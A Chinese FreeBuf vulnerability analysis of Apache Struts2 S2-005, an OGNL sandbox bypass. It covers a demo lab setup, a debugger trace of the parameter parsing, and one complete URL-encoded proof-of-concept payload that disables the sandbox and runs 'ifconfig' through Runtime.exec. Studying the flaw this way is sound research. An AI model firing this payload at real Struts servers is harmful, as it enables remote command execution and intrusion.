***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ***本文原创作者：水清云影，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

![](https://image.3001.net/images/20181227/1545915975319.jpg!small)

## 一、漏洞信息

> 官方链接：<https://cwiki.apache.org/confluence/display/WW/S2-005>
>
> 官方概述：XWork ParameterInterceptors bypass allows remote command execution
>
> 影响版本：Struts 2.0.0 - Struts 2.1.8.1
>
> 修复摘要：Developers should immediately upgrade to Struts 2.2.1 or read the
> following solution instructions carefully for a configuration change to
> mitigate the vulnerability

## 二、漏洞原理

S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003。

## 三、环境搭建

 **下载 Struts2.0.11.2**
：<http://archive.apache.org/dist/struts/binaries/struts-2.1.8.1-all.zip>

 **目录结构**![](https://image.3001.net/images/20181227/15459159822495.jpg!small)

 **引用的包** ：

> commons-fileupload-1.2.1.jar
>
> commons-logging-1.0.4.jar
>
> freemarker-2.3.15.jar
>
> ognl-2.7.3.jar
>
> struts2-core-2.1.8.1.jar
>
> xwork-2.0.5.jar

 **index.jsp**

    
    
    <%@ page language="java" contentType="text/html; charset=UTF-8"
        pageEncoding="UTF-8"%>
    <%@ taglib prefix="s" uri="/struts-tags" %>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>S2-005</title>
    </head>
    <body>
    <h2>S2-005 Demo</h2>
    <p>link: <a href="https://cwiki.apache.org/confluence/display/WW/S2-005">https://cwiki.apache.org/confluence/display/WW/S2-005</a></p>
    <s:form action="login">
        <s:textfield name="username" label="username" />
        <s:textfield name="password" label="password" />
        <s:submit></s:submit>
    </s:form>
    </body>
    </html>
    

**welcome.jsp**

    
    
    <%@ page language="java" contentType="text/html; charset=UTF-8"
        pageEncoding="UTF-8"%>
    <%@ taglib prefix="s" uri="/struts-tags" %>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>S2-005</title>
    </head>
    <body>
    <p>Hello <s:property value="username"></s:property></p>
    </body>
    </html>
    

**struts.xml**

    
    
    <?xml version="1.0" encoding="UTF-8" ?>
    <!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
        "http://struts.apache.org/dtds/struts-2.0.dtd">
    <struts>
        <package name="S2-005" extends="struts-default">
            <action name="login" class="com.demo.action.LoginAction">
                <result name="success">welcome.jsp</result>
                <result name="error">index.jsp</result>
            </action>
        </package>
    </struts>
    

**com.demo.action.LoginAction.java**

    
    
    package com.demo.action;
    
    import com.opensymphony.xwork2.ActionSupport;
    
    public class LoginAction extends ActionSupport {
        private String username = null;
        private String password = null;
    
        public String getUsername() {
            return this.username;
        }
    
        public String getPassword() {
            return this.password;
        }
    
        public void setUsername(String username) {
            this.username = username;
        }
    
        public void setPassword(String password) {
            this.password = password;
        }
    
        public String execute() throws Exception {
            if ((this.username.isEmpty()) || (this.password.isEmpty())) {
                return "error";
            }
            if ((this.username.equalsIgnoreCase("admin"))
                    && (this.password.equals("admin"))) {
                return "success";
            }
            return "error";
        }
    }
    

**web.xml**

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://xmlns.jcp.org/xml/ns/javaee" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" id="WebApp_ID" version="3.1">
    
        <display-name>S2-005 Example</display-name>
    
        <filter>
            <filter-name>struts2</filter-name>
            <filter-class>org.apache.struts2.dispatcher.FilterDispatcher</filter-class>
        </filter>
    
        <filter-mapping>
            <filter-name>struts2</filter-name>
            <url-pattern>/*</url-pattern>
        </filter-mapping>
    
        <welcome-file-list>
            <welcome-file>index.jsp</welcome-file>
        </welcome-file-list>
    
    </web-app>
    

## 四、漏洞分析

首先我们来看看官方是如何修补的S2-003呢？它是新出了一个沙盒机制，默认禁止了静态方法的调用（`allowStaticMethodAcces`和`MethodAccessor.denyMethodExecution`）

所以我们可以利用OGNL先把沙盒关闭掉，就又可以执行命令了。

>
> `xwork.MethodAccessor.denyMethodExecution`设置为false`allowStaticMethodAccess`设置为true

这样就可以关闭掉沙盒机制，unicode编码仍然还是可以的，`\u0023`会被解析成`#`，POC还是原来的POC，只不过加上了上面的两个设置，接下来我们可以看看具体漏洞分析的过程

这里还是在[Tomcat6](https://archive.apache.org/dist/tomcat/tomcat-6/v6.0.20/bin/apache-tomcat-6.0.20.zip)环境下进行分析。

和S2-003大体相同，在`xwork-core-2.1.16.jar!com/opensymphony/xwork2/interceptor/ParametersInterceptor`中断点调试

![](https://image.3001.net/images/20181227/1545916008755.jpg!small)

跟进`setParameters`，会进入到`xwork-core-2.1.16.jar!com/opensymphony/xwork2/ognl/OgnlValueStack`，可以看出在Ognl中，值栈（ValueStack）的实现类是OgnlValueStack

![](https://image.3001.net/images/20181227/15459160154976.jpg!small)

发现在里面封装了一个`setValue`类，跟入ognlUtil.setValue，会进入到`xwork-core-2.1.16.jar!com/opensymphony/xwork2/ognl/OgnlUtil`中，这里又封装了一遍`setValue`类，最终调用了Ognl中的setValue方法

![](https://image.3001.net/images/20181227/15459160263344.jpg!small)

可以看到其中的`compile`方法，会将传来的字符串进行解析，而name值就是我们传递过来的参数值，跟进`compile`方法

![](https://image.3001.net/images/20181227/15459160347902.jpg!small)

跟进`parseExpression`，这里从`topLevelExpression`开始对语法书进行解析，进入到`ognl-2.7.3.jar!ognl/OgnlParser`中的`expression()`进行解析，可以看到，最后将结果保存到值栈中,`\u0023`被解析成`#`

![](https://image.3001.net/images/20181227/15459160414629.jpg!small)

然后将解析的结果return回去

![](https://image.3001.net/images/20181227/15459160473661.jpg!small)

## 五、漏洞利用

>
> [http://localhost:1111/login.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023mycmd\u003d\'ifconfig\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla](http://localhost:1111/login.action?\('%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse'\)\(bla\)\(bla\)&\('%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue'\)\(bla\)\(bla\)&\('%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET'\)\(kxlzx\)\(kxlzx\)&\('%5Cu0023mycmd%5Cu003d%5C'ifconfig%5C''\)\(bla\)\(bla\)&\('%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime\(\).exec\(%5Cu0023mycmd\)'\)\(bla\)\(bla\)&\(A\)\(\('%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream\(%5Cu0023myret.getInputStream\(\)\)'\)\(bla\)\)&\(B\)\(\('%5Cu0023myres%5Cu003dnew%5C40byte%5B51020%5D'\)\(bla\)\)&\(C\)\(\('%5Cu0023mydat.readFully\(%5Cu0023myres\)'\)\(bla\)\)&\(D\)\(\('%5Cu0023mystr%5Cu003dnew%5C40java.lang.String\(%5Cu0023myres\)'\)\(bla\)\)&\('%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse\(\)'\)\(bla\)\(bla\)&\(E\)\(\('%5Cu0023myout.getWriter\(\).println\(%5Cu0023mystr\)'\)\(bla)))

![](https://image.3001.net/images/20181227/15459160586392.jpg!small)

## 参考链接

> <https://cwiki.apache.org/confluence/display/WW/S2-005>
>
> <https://blog.csdn.net/u011721501/article/details/41626959>
>
> <https://xz.aliyun.com/t/2323>

 ***本文原创作者：水清云影，本文属FreeBuf原创奖励计划，未经许可禁止转载**

